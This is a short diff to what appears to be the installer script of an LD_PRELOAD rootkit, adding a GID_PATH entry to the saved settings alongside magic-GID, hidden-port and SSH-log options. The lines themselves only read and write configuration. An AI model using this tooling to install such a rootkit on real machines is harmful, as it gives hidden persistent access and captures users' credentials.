@@ -69,10 +69,11 @@ read_defaults(){ # $1 = path to write to
     SSH_LOGS=${settings[6]}
     INTEREST_DIR=${settings[7]}
     BD_VAR=${settings[8]}
+    GID_PATH=${settings[9]}
 }
 
 write_defaults(){ # $1 = path to write to
     printf "# do not edit anything in this file!\n$MAGIC_GID\n$INSTALL_DIR\n$LDSO_PRELOAD\n$BDVLSO\n\
 $SOPATH\n$HIDEPORTS\n$SSH_LOGS\n$INTEREST_DIR\n\
-$BD_VAR" > $1
+$BD_VAR\n$GID_PATH" > $1
 }
